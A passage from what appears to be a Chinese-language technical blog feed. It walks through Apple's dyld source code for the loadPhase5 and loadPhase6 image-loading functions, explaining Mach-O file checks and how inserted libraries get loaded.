<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5load</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	ImageLoader* image = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// just return NULL if file not found, but record any other errors</span></span><br><span class="line">	<span class="keyword">struct</span> stat stat_buf;</span><br><span class="line">	<span class="keyword">if</span> ( my_stat(path, &amp;stat_buf) == -<span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = errno;</span><br><span class="line">		<span class="keyword">if</span> ( err != ENOENT ) &#123;</span><br><span class="line">			exceptions-&gt;push_back(dyld::mkstringf(<span class="string">"%s: stat() failed with errno=%d"</span>, path, err));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// in case image was renamed or found via symlinks, check for inode match</span></span><br><span class="line">	image = findLoadedImage(stat_buf);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// do nothing if not already loaded and if RTLD_NOLOAD or NSADDIMAGE_OPTION_RETURN_ONLY_IF_LOADED</span></span><br><span class="line">	<span class="comment">//RTLD_NOLOAD或者NSADDIMAGE_OPTION_RETURN_ONLY_IF_LOADED字段设置了则不进行加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.dontLoad )</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> DYLD_SHARED_CACHE_SUPPORT</span></span><br><span class="line">	<span class="comment">// see if this image is in shared cache</span></span><br><span class="line">	<span class="keyword">const</span> macho_header* mhInCache;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>*			pathInCache;</span><br><span class="line">	<span class="keyword">long</span>				slideInCache;</span><br><span class="line">	<span class="comment">// 如果在sharedCacheImage中找到了，则通过cache来加载</span></span><br><span class="line">	<span class="keyword">if</span> ( findInSharedCacheImage(path, <span class="literal">false</span>, &amp;stat_buf, &amp;mhInCache, &amp;pathInCache, &amp;slideInCache) ) &#123;</span><br><span class="line">		image = ImageLoaderMachO::instantiateFromCache(mhInCache, pathInCache, slideInCache, stat_buf, gLinkContext);</span><br><span class="line">		<span class="keyword">return</span> checkandAddImage(image, context);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// file exists and is not in dyld shared cache, so open it</span></span><br><span class="line">	<span class="comment">// shared_cache中不存在image，则通过LoadPhase5open来加载image</span></span><br><span class="line">	<span class="keyword">return</span> loadPhase5open(path, context, stat_buf, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-7_loadPhase5open与loadPhase6">2.7  loadPhase5open与loadPhase6</h2><p><code>loadPhase5open</code>只是一个简单的封装。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据路径打开文件</span></span><br><span class="line"><span class="comment">//调用loadPhase6</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context, <span class="keyword">const</span> <span class="keyword">struct</span> stat&amp; stat_buf, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// open file (automagically closed when this function exits)</span></span><br><span class="line">	<span class="function">FileOpener <span class="title">file</span><span class="params">(path)</span></span>;</span><br><span class="line">		</span><br><span class="line">	<span class="comment">// just return NULL if file not found, but record any other errors</span></span><br><span class="line">	<span class="keyword">if</span> ( file.getFileDescriptor() == -<span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = errno;</span><br><span class="line">		<span class="keyword">if</span> ( err != ENOENT ) &#123;</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span>* newMsg = dyld::mkstringf(<span class="string">"%s: open() failed with errno=%d"</span>, path, err);</span><br><span class="line">			exceptions-&gt;push_back(newMsg);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> loadPhase6(file.getFileDescriptor(), stat_buf, path, context);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (<span class="keyword">const</span> <span class="keyword">char</span>* msg) &#123;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span>* newMsg = dyld::mkstringf(<span class="string">"%s: %s"</span>, path, msg);</span><br><span class="line">		exceptions-&gt;push_back(newMsg);</span><br><span class="line">		<span class="built_in">free</span>((<span class="keyword">void</span>*)msg);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>做了错误提示之后，调用了<code>loadPhase6</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase6</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">struct</span> stat&amp; stat_buf, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s)\n", __func__ , path);</span></span><br><span class="line">	<span class="keyword">uint64_t</span> fileOffset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span> fileLength = stat_buf.st_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// validate it is a file (not directory)</span></span><br><span class="line">	<span class="keyword">if</span> ( (stat_buf.st_mode &amp; S_IFMT) != S_IFREG ) </span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"not a file"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span> firstPage[<span class="number">4096</span>];</span><br><span class="line">	<span class="keyword">bool</span> shortPage = <span class="literal">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// min mach-o file is 4K</span></span><br><span class="line">	<span class="keyword">if</span> ( fileLength &lt; <span class="number">4096</span> ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( pread(fd, firstPage, fileLength, <span class="number">0</span>) != (<span class="keyword">ssize_t</span>)fileLength )</span><br><span class="line">			throwf(<span class="string">"pread of short file failed: %d"</span>, errno);</span><br><span class="line">		shortPage = <span class="literal">true</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( pread(fd, firstPage, <span class="number">4096</span>,<span class="number">0</span>) != <span class="number">4096</span> )</span><br><span class="line">			throwf(<span class="string">"pread of first 4K failed: %d"</span>, errno);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// if fat wrapper, find usable sub-file</span></span><br><span class="line">	<span class="comment">// 如果是一个fat格式的文件，找到对应的子文件</span></span><br><span class="line">	<span class="comment">// 从fat文件中找到对应子文件的代码。</span></span><br><span class="line">	<span class="keyword">const</span> fat_header* fileStartAsFat = (fat_header*)firstPage;</span><br><span class="line">	<span class="keyword">if</span> ( fileStartAsFat-&gt;magic == OSSwapBigToHostInt32(FAT_MAGIC) ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( fatFindBest(fileStartAsFat, &amp;fileOffset, &amp;fileLength) ) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( (fileOffset+fileLength) &gt; (<span class="keyword">uint64_t</span>)(stat_buf.st_size) )</span><br><span class="line">				throwf(<span class="string">"truncated fat file.  file length=%llu, but needed slice goes to %llu"</span>, stat_buf.st_size, fileOffset+fileLength);</span><br><span class="line">			<span class="keyword">if</span> (pread(fd, firstPage, <span class="number">4096</span>, fileOffset) != <span class="number">4096</span>)</span><br><span class="line">				throwf(<span class="string">"pread of fat file failed: %d"</span>, errno);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"no matching architecture in universal wrapper"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try mach-o loader</span></span><br><span class="line">	<span class="keyword">if</span> ( shortPage ) </span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"file too short"</span>;</span><br><span class="line">	<span class="comment">// 检测运行平台是否正确</span></span><br><span class="line">	<span class="keyword">if</span> ( isCompatibleMachO(firstPage, path) ) &#123;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">// only MH_BUNDLE, MH_DYLIB, and some MH_EXECUTE can be dynamically loaded</span></span><br><span class="line">		<span class="comment">// 只有MH_EXECUTE，MH_DYLIB，MH_BUNDLE三种文件才可被动态加载</span></span><br><span class="line">		<span class="keyword">switch</span> ( ((mach_header*)firstPage)-&gt;filetype ) &#123;</span><br><span class="line">			<span class="keyword">case</span> MH_EXECUTE:</span><br><span class="line">			<span class="keyword">case</span> MH_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> MH_BUNDLE:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">throw</span> <span class="string">"mach-o, but wrong filetype"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> TARGET_IPHONE_SIMULATOR	</span></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">if</span> TARGET_OS_WATCH || TARGET_OS_TV</span></span><br><span class="line">		<span class="comment">// disable error during bring up of these simulators</span></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="comment">// &lt;rdar://problem/14168872&gt; dyld_sim should restrict loading osx binaries</span></span><br><span class="line">		<span class="keyword">if</span> ( !isSimulatorBinary(firstPage, path) ) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"mach-o, but not built for iOS simulator"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// instantiate an image</span></span><br><span class="line">		ImageLoader* image = ImageLoaderMachO::instantiateFromFile(path, fd, firstPage, fileOffset, fileLength, stat_buf, gLinkContext);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// validate</span></span><br><span class="line">		<span class="keyword">return</span> checkandAddImage(image, context);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try other file formats here...</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// throw error about what was found</span></span><br><span class="line">	<span class="keyword">switch</span> (*(<span class="keyword">uint32_t</span>*)firstPage) &#123;</span><br><span class="line">		<span class="keyword">case</span> MH_MAGIC:</span><br><span class="line">		<span class="keyword">case</span> MH_CIGAM:</span><br><span class="line">		<span class="keyword">case</span> MH_MAGIC_64:</span><br><span class="line">		<span class="keyword">case</span> MH_CIGAM_64:</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"mach-o, but wrong architecture"</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		throwf(<span class="string">"unknown file type, first eight bytes: 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X"</span>, </span><br><span class="line">			firstPage[<span class="number">0</span>], firstPage[<span class="number">1</span>], firstPage[<span class="number">2</span>], firstPage[<span class="number">3</span>], firstPage[<span class="number">4</span>], firstPage[<span class="number">5</span>], firstPage[<span class="number">6</span>],firstPage[<span class="number">7</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>做了Fat格式的检测，子类型文件提取。</li>
<li>检测Mach-O类型，只有<code>MH_EXECUTE</code>，<code>MH_DYLIB</code>，<code>MH_BUNDLE</code>三种文件才可被动态加载。</li>
<li>通过<code>ImageLoaderMachO::instantiateFromFile</code>生成<code>ImageLoader</code>的实例。</li>
</ul>
<h1 id="0x03_小结">0x03 小结</h1><p><code>Load</code>的函数调用流程就是一系列的loadPhase*函数的调用，在<code>load</code>最后都会通过ImageLoader的构造函数，实例化ImageLoader，接下来 就需要分析ImageLoader的几个不同的构造函数。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在<code>OS X</code>或者<code>IOS</code>上运行一个程序时，dyld除了需要加载主要的执行程序之外，还需要加载需要的库文件以及库文件依赖的库文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br></pre></td></tr></table></figure>
<p>这一条函数调用加载了需要运行的程序，具体详细分析可以参考<a href="http://BLOGIMAGE/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">dyld中mach-o文件加载的简单分析</a>。</p>
<p>而在<code>link</code>主程序之前还会动态的加载一些其他的库文件。例如<code>DYLD_INSERT_LIBRARIES</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load any inserted libraries</span></span><br><span class="line"><span class="comment">// 类似于linux里面的LD_PRELOAD</span></span><br><span class="line"><span class="keyword">if</span>	( sEnv.DYLD_INSERT_LIBRARIES != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* lib = sEnv.DYLD_INSERT_LIBRARIES; *lib != <span class="literal">NULL</span>; ++lib) </span><br><span class="line">		loadInsertedDylib(*lib); <span class="comment">//!!!动态加载dylib</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// record count of inserted libraries so that a flat search will look at </span></span><br><span class="line"><span class="comment">// inserted libraries, then main, then others.</span></span><br><span class="line">sInsertedDylibCount = sAllImages.size()-<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>loadInsertedDylib</code>的实现其实就是简单的调用<code>load</code>函数。通过简单的分析<code>load</code>函数，增强对dyld工作流程的理解。</p>]]>
    
    </summary>
    
      <category term="dlopen" scheme="http://turingh.github.io/tags/dlopen/"/>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
</feed>
